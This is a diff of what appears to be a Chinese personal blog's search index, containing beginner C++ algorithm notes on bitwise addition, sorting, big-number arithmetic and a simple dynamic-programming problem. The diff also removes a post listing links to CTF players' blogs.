-<h4 id="两整数之和"><a href="#两整数之和" class="headerlink" title="两整数之和"></a>两整数之和</h4><p>阴间题目，要求不能用+，-完成两数求和。</p>
-<p><a href="https://leetcode.cn/problems/sum-of-two-integers/">https://leetcode.cn/problems/sum-of-two-integers/</a></p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">getSum</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> b==<span class="number">0</span>?a:getSum(a^b,(<span class="type">unsigned</span> <span class="type">int</span>)(a&amp;b)&lt;&lt;<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>分析：首先已知a^b可以表示为不考虑a和b的情况下a和b的家和，因此我们要找到进位情况下进的位的那个数字，是(a&amp;b)&lt;&lt;1，因此呢我们只要递归运算a^b和(a&amp;b)&lt;&lt;1的和即可。每次当我们进行(a&amp;b)&lt;&lt;1时，产生的结果0，1分别代表着不进位，进位。因此，如果不进位，结果就是a^b，即返回函数参数“a”。而当结果不为0，即连个数字都为1时，需要进位，进位则表示着这一个1在后一位相加，而后一位的相加同样可以表示为上述过程，仔细思考可以发现，递归出口在函数参数”b”为0的时候，这个时候进位完毕，输出结果a^b就是最后答案。</p>
-<h4 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h4><p><a href="https://leetcode.cn/problems/insert-into-bits-lcci/">https://leetcode.cn/problems/insert-into-bits-lcci/</a></p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">insertBits</span><span class="params">(<span class="type">int</span> N, <span class="type">int</span> M, <span class="type">int</span> i, <span class="type">int</span> j)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> k=i;k&lt;=j;k++)</span><br><span class="line">    &#123;</span><br><span class="line">        N&amp;=~((<span class="type">long</span> <span class="type">long</span>)<span class="number">1</span>&lt;&lt;k);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> N|(M&lt;&lt;i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>解析：博主摆烂了…</p>
-]]></content>
-      <categories>
-        <category>算法</category>
-      </categories>
-      <tags>
-        <tag>C++</tag>
-        <tag>算法</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>基础算法01</title>
-    <url>/2022/07/01/%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%9501/</url>
-    <content><![CDATA[<p> 这里存放一点非常基础的算法，忘记了可以来看一眼。</p>
-<p>主要是：排序总结，高精度总结。</p>
-<span id="more"></span>
-
-<h3 id="排序模板"><a href="#排序模板" class="headerlink" title="排序模板"></a>排序模板</h3><h4 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h4><p>这应该是最经典的排序方法，实现也很简单，也很好理解，但是时间会慢一点，复杂度是O($n^2$)</p>
-<p>原理大概意思是比较相邻的两个数，如果他们的关系是正确的，则不做操作，如不是，则交换两个数的位置，这样从头到尾进行一次之后最大的数应该是在最后的位置，这个数就是正确顺序的，就像一个泡泡一样冒到了边缘(?    再次重复这个操作，一次完成n-1，n-2，……的排序，至此排序完成。</p>
-<p>核心代码如下:</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; i++)<span class="comment">//外层循环记录要大排序次数，是数组元素数量-1</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n - i - <span class="number">1</span>; j++)<span class="comment">//内层循环记录在一次排序下两两比较的次数，是大排序总次数减去当前排序的次数</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>]) <span class="built_in">swap</span>(arr[j], arr[j + <span class="number">1</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>实现较为简单，因为有两层循环的缘故，时间可能较慢，另外需要注意两次循环的边界条件</p>
-<h4 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h4><p>快排是c++内置sort函数的排序方法，时间会比较快，最好的情况是O($n\log_2 n$),最坏的情况是O($n^2$),平均复杂度在O($n \log_2 n$),因此用的比较多。</p>
-<p>原理也比较好理解:先把整个数列分成两部分，把两边的数据和中间值比较，比中间值小的放左边，反之放右边，依次操作完毕后这个中间值就是已排序状态，然后分别用同样的方法操作左右两段数据，可以看出这是根据递归定义的排序方法，在递归最底层达到条件：找不到中间值时，整段数据已经排序完毕。这里解释的不是特别全面，有一些情况可以根据代码举个例子理解。</p>
-<p>核心代码大同小异，这里我就摆一种：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">quicksort</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> r)</span><span class="comment">//l,r表示数组的左右两端</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> mid=arr[(l+r)/<span class="number">2</span>];</span><br><span class="line">	<span class="type">int</span> i=l,j=r;</span><br><span class="line">	<span class="keyword">while</span>(i&lt;=j)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">while</span>(arr[i]&lt;mid) i++;</span><br><span class="line">		<span class="keyword">while</span>(arr[j]&gt;mid) j--;</span><br><span class="line">		<span class="keyword">if</span>(i&lt;=j)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">swap</span>(arr[i],arr[j]);</span><br><span class="line">			i++;</span><br><span class="line">			j--;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(l&lt;j) <span class="built_in">quicksort</span>(l,j);</span><br><span class="line">	<span class="keyword">if</span>(r&gt;i) <span class="built_in">quicksort</span>(i,r);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>排序就先摆两个吧，有空了再贴(画饼</p>
-<h3 id="高精度计算"><a href="#高精度计算" class="headerlink" title="高精度计算"></a>高精度计算</h3><h4 id="a-b高精度"><a href="#a-b高精度" class="headerlink" title="a+b高精度"></a>a+b高精度</h4><p>高精度计算在c++中会出现是因为即使是unsigned long long型的数据最大值也就在二十位数据，也就是18446744073709551615，这样一个数据如果超过了，c++就显示不了了，会发生溢出的现象，但是在实际计算中计算大数据也不少见，因此需要用到高精度的技巧。</p>
-<p>高精度一个很基础的想法就是数无法使用，那就使用数组，基本思路是使用字符串型读入数据，再转入数组之中进行操作。下一步可以理解为模拟竖式加法的做法，依次从个位开始对两个数字进行相加，大于10则保留个位并将十位上进一，依次操作到最后一位，并将结果数组倒序输出即可。</p>
-<p><strong>实现代码：</strong></p>
-<p>读入数组部分：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">change_arr</span><span class="params">(string a ,string b)</span><span class="comment">//转换函数，熟练之后可以和相加函数结合 </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;a.<span class="built_in">size</span>();i++)<span class="comment">//转换注意需要倒序读入数组，因为相加需要进位 </span></span><br><span class="line">	&#123;</span><br><span class="line">		arr_a[a.<span class="built_in">size</span>()-i<span class="number">-1</span>]=a[i]<span class="number">-48</span>;<span class="comment">//一次只能读入一个数组，因为两个大数字位数不一定相等</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;b.<span class="built_in">size</span>();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr_b[b.<span class="built_in">size</span>()-i<span class="number">-1</span>]=b[i]<span class="number">-48</span>;<span class="comment">//这里减去48可以换成&#x27;0&#x27; </span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>计算部分：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">tooplus</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> temp=<span class="built_in">max</span>(a.<span class="built_in">size</span>(),b.<span class="built_in">size</span>());</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;temp;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		s[i]+=arr_a[i]+arr_b[i];<span class="comment">//这里必须使用+=因为要注意前一位的进位，防止丢失数据</span></span><br><span class="line">		s[i+<span class="number">1</span>]=s[i]/<span class="number">10</span>;</span><br><span class="line">		s[i]%=<span class="number">10</span>;<span class="comment">//标准操作，进位且本位取最后一位数字 </span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(s[temp]&gt;<span class="number">0</span>) add=<span class="number">1</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>全部代码：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">string a,b;<span class="comment">//在long long 存储不了的情况下，基本思路是通过字符串读入，转到数组进行操作 </span></span><br><span class="line"><span class="type">int</span> arr_a[<span class="number">100005</span>],arr_b[<span class="number">100005</span>],s[<span class="number">100005</span>],add=<span class="number">0</span>;<span class="comment">//s数组用于储存加完之后的数字 ,add用于处理进位的数字 </span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">change_arr</span><span class="params">(string a ,string b)</span><span class="comment">//转换函数，熟练之后可以和相加函数结合 </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;a.<span class="built_in">size</span>();i++)<span class="comment">//转换注意需要倒序读入数组，因为相加需要进位 </span></span><br><span class="line">	&#123;</span><br><span class="line">		arr_a[a.<span class="built_in">size</span>()-i<span class="number">-1</span>]=a[i]<span class="number">-48</span>;<span class="comment">//一次只能读入一个数组，因为两个大数字位数不一定相等</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;b.<span class="built_in">size</span>();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr_b[b.<span class="built_in">size</span>()-i<span class="number">-1</span>]=b[i]<span class="number">-48</span>;<span class="comment">//这里减去48可以换成&#x27;0&#x27; </span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">tooplus</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> temp=<span class="built_in">max</span>(a.<span class="built_in">size</span>(),b.<span class="built_in">size</span>());</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;temp;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		s[i]+=arr_a[i]+arr_b[i];<span class="comment">//这里必须使用+=因为要注意前一位的进位，防止丢失数据</span></span><br><span class="line">		s[i+<span class="number">1</span>]=s[i]/<span class="number">10</span>;</span><br><span class="line">		s[i]%=<span class="number">10</span>;<span class="comment">//标准操作，进位且本位取最后一位数字 </span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(s[temp]&gt;<span class="number">0</span>) add=<span class="number">1</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">	cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	cin&gt;&gt;a&gt;&gt;b;<span class="comment">//读入数据，为string型</span></span><br><span class="line">	<span class="built_in">change_arr</span>(a,b);</span><br><span class="line">	<span class="built_in">tooplus</span>();</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="built_in">max</span>(a.<span class="built_in">size</span>(),b.<span class="built_in">size</span>())+add<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)<span class="comment">//判断输出的时候是否需要输出最终多出的一位 </span></span><br><span class="line">	&#123;</span><br><span class="line">		cout&lt;&lt;s[i]; </span><br><span class="line">	&#125;</span><br><span class="line">	 <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这里有一道例题，洛谷的p1601,可以用这个解法。</p>
-<h4 id="a-b高精度，a-b高精度"><a href="#a-b高精度，a-b高精度" class="headerlink" title="a-b高精度，a*b高精度"></a>a-b高精度，a*b高精度</h4><p>这两种方法基本一样，要注意的是减法有一些特殊情况，比如负数，输出长度的判断等等，这里我就摆一种简单的，乘法也是需要注意长度区别。</p>
-<p>实现代码：</p>
-<p>减法：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">string a,b;</span><br><span class="line"><span class="type">bool</span> jg;</span><br><span class="line"><span class="type">int</span> arr_a[<span class="number">100005</span>],arr_b[<span class="number">10005</span>],ans[<span class="number">100005</span>],temp;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">re_input</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">1</span>;i&lt;=a.<span class="built_in">size</span>();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr_a[i]=a[a.<span class="built_in">size</span>()-i]-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> j =<span class="number">1</span>;j&lt;=b.<span class="built_in">size</span>();j++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr_b[j]=b[b.<span class="built_in">size</span>()-j]-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">to_divide</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">1</span>;i&lt;=temp;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(arr_a[i]&lt;arr_b[i])</span><br><span class="line">		&#123;</span><br><span class="line">			arr_a[i+<span class="number">1</span>]--;</span><br><span class="line">			arr_a[i]+=<span class="number">10</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		ans[i]=arr_a[i]-arr_b[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(ans[temp]==<span class="number">0</span>) temp--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">to_printf</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(jg==<span class="literal">true</span>) cout&lt;&lt;<span class="string">&quot;-&quot;</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =temp;i&gt;<span class="number">0</span>;i--)</span><br><span class="line">	&#123;</span><br><span class="line">		cout&lt;&lt;ans[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(temp&lt;<span class="number">1</span>) cout&lt;&lt;<span class="string">&quot;0&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">	cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	cin&gt;&gt;a&gt;&gt;b;</span><br><span class="line">	<span class="keyword">if</span>(a&lt;b&amp;&amp;a.<span class="built_in">size</span>()==b.<span class="built_in">size</span>()||a.<span class="built_in">size</span>()&lt;b.<span class="built_in">size</span>())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">swap</span>(a,b);</span><br><span class="line">		jg=<span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	temp=<span class="built_in">max</span>(a.<span class="built_in">size</span>(),b.<span class="built_in">size</span>());</span><br><span class="line">	<span class="built_in">re_input</span>();</span><br><span class="line">	<span class="built_in">to_divide</span>();</span><br><span class="line">	<span class="built_in">to_printf</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>乘法：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">string a,b;</span><br><span class="line"><span class="type">int</span> arr01[<span class="number">100005</span>],arr02[<span class="number">100005</span>],sum[<span class="number">100005</span>],temp=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">re_change</span><span class="params">()</span><span class="comment">//倒序存储部分 </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;a.<span class="built_in">size</span>();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr01[i]=a[a.<span class="built_in">size</span>()-i<span class="number">-1</span>]<span class="number">-48</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;b.<span class="built_in">size</span>();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr02[i]=b[b.<span class="built_in">size</span>()-i<span class="number">-1</span>]<span class="number">-48</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">mutiply</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;b.<span class="built_in">size</span>();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j =<span class="number">0</span>;j&lt;a.<span class="built_in">size</span>();j++)</span><br><span class="line">		&#123;</span><br><span class="line">			sum[i+j]+=arr01[j]*arr02[i];<span class="comment">//注意下标从1开始，进位减去1 </span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(temp =<span class="number">0</span>;temp&lt;=a.<span class="built_in">size</span>()+b.<span class="built_in">size</span>();temp++)<span class="comment">//处理进位 </span></span><br><span class="line">	&#123;</span><br><span class="line">		</span><br><span class="line">		sum[temp]+=sum[temp<span class="number">-1</span>]/<span class="number">10</span>;</span><br><span class="line">		sum[temp<span class="number">-1</span>]%=<span class="number">10</span>;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//temp=a.size()+b.size();</span></span><br><span class="line">	<span class="keyword">while</span>(sum[temp]==<span class="number">0</span>&amp;&amp;temp&gt;=<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		temp--;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line"> &#125; </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">	cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	cin&gt;&gt;a&gt;&gt;b;</span><br><span class="line">	<span class="built_in">re_change</span>();</span><br><span class="line">	<span class="built_in">mutiply</span>();</span><br><span class="line">	<span class="keyword">for</span>(;temp&gt;=<span class="number">0</span>;temp--)</span><br><span class="line">	&#123;</span><br><span class="line">		cout&lt;&lt;sum[temp];</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>以上内容皆为初学者的浅薄理解，如有错误麻烦立即告诉作者，别喷别喷别喷呜呜呜~</p>
-]]></content>
-      <categories>
-        <category>算法</category>
-      </categories>
-      <tags>
-        <tag>C++</tag>
-        <tag>算法</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>基础算法02</title>
-    <url>/2022/07/01/%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%9502/</url>
-    <content><![CDATA[<p> dp(动态规划)的基本例题，可以浅浅的帮助理解。</p>
-<span id="more"></span>
-
-<h4 id="例题一"><a href="#例题一" class="headerlink" title="例题一"></a>例题一</h4><p>先来看一道很简单的例题：</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a51T.png"></p>
-<p>具体要求如下：</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a51U.png"></p>
-<p>根据格式可以推出状态方程，这个方程不难，主要关注dp思想，找到状态方程，此题不难发现每一个数字只能往下或者往右走，因此每一个位置的最大值就等于其上面或上左位置的最大值，找到每一个数的最大值，这基本就是动态规划的思想。</p>
-<p>核心代码如下：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">dpcount</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			dp[i][j]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][j],dp[i<span class="number">-1</span>][j<span class="number">-1</span>])+number[i][j];</span><br><span class="line">			<span class="keyword">if</span>(dp[i][j]&gt;ans)	ans=dp[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>ac代码如下：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">int</span> ans;</span><br><span class="line"><span class="type">int</span> dp[<span class="number">1005</span>][<span class="number">1005</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> number[<span class="number">1005</span>][<span class="number">1005</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dpcount</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			dp[i][j]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][j],dp[i<span class="number">-1</span>][j<span class="number">-1</span>])+number[i][j];</span><br><span class="line">			<span class="keyword">if</span>(dp[i][j]&gt;ans)	ans=dp[i][j];</span><br><span class="line">		</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">	cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	cin&gt;&gt;n;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j =<span class="number">1</span>;j&lt;=i;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			cin&gt;&gt;number[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">dpcount</span>();</span><br><span class="line">	cout&lt;&lt;ans;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>算法</category>
-      </categories>
-      <tags>
-        <tag>C++</tag>
-        <tag>算法</tag>
-      </tags>
   </entry>
   <entry>
     <title>线代预习一些知识</title>
@@ -526,6 +521,26 @@
       </categories>
       <tags>
         <tag>线性代数</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>计算机体系结构复习</title>
+    <url>/2022/06/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/</url>
+    <content><![CDATA[<p> 大一下预习计算机体系结构</p>
+<span id="more"></span>
+
+<h4 id="原码反码补码"><a href="#原码反码补码" class="headerlink" title="原码反码补码"></a>原码反码补码</h4><ul>
+<li>原码：二进制形式</li>
+<li>反码：原码除符号位不变，其余全部取反</li>
+<li>补码：反码加一 ($a-b$的意思是a加上b的补码)</li>
+</ul>
+<p>减法器可以用一个加法器，一个非门，一个VDD组合构成。</p>
+]]></content>
+      <categories>
+        <category>大一课程</category>
+      </categories>
+      <tags>
+        <tag>计算机原理</tag>
       </tags>
   </entry>
   <entry>
@@ -616,36 +631,29 @@
       </tags>
   </entry>
   <entry>
-    <title>大牛的博客(学习用)</title>
-    <url>/2022/09/22/%E5%A4%A7%E7%89%9B%E7%9A%84%E5%8D%9A%E5%AE%A2-%E5%AD%A6%E4%B9%A0%E7%94%A8/</url>
-    <content><![CDATA[<p> 这里收录一些大佬的博客，可以跟着学习：</p>
+    <title>基础算法02</title>
+    <url>/2022/07/01/%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%9502/</url>
+    <content><![CDATA[<p> dp(动态规划)的基本例题，可以浅浅的帮助理解。</p>
 <span id="more"></span>
 
-<h2 id="Pwn手师傅们的博客"><a href="#Pwn手师傅们的博客" class="headerlink" title="Pwn手师傅们的博客"></a>Pwn手师傅们的博客</h2><p><a href="https://godjj.top/">https://godjj.top/</a></p>
-<p><a href="https://csomepro.github.io/">https://csomepro.github.io/</a></p>
-<p><a href="https://www.cnblogs.com/ZIKH26">https://www.cnblogs.com/ZIKH26</a></p>
-<p><a href="https://github.com/tangzichengcc/The_Growth_Path_Of_A_CTFer_And_Pwner">https://github.com/tangzichengcc/The_Growth_Path_Of_A_CTFer_And_Pwner</a></p>
-<p><a href="http://blog.eonew.cn/">http://blog.eonew.cn/</a></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>计算机体系结构复习</title>
-    <url>/2022/06/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/</url>
-    <content><![CDATA[<p> 大一下预习计算机体系结构</p>
-<span id="more"></span>
+<h4 id="例题一"><a href="#例题一" class="headerlink" title="例题一"></a>例题一</h4><p>先来看一道很简单的例题：</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a51T.png"></p>
+<p>具体要求如下：</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a51U.png"></p>
+<p>根据格式可以推出状态方程，这个方程不难，主要关注dp思想，找到状态方程，此题不难发现每一个数字只能往下或者往右走，因此每一个位置的最大值就等于其上面或上左位置的最大值，找到每一个数的最大值，这基本就是动态规划的思想。</p>
+<p>核心代码如下：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">dpcount</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			dp[i][j]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][j],dp[i<span class="number">-1</span>][j<span class="number">-1</span>])+number[i][j];</span><br><span class="line">			<span class="keyword">if</span>(dp[i][j]&gt;ans)	ans=dp[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span 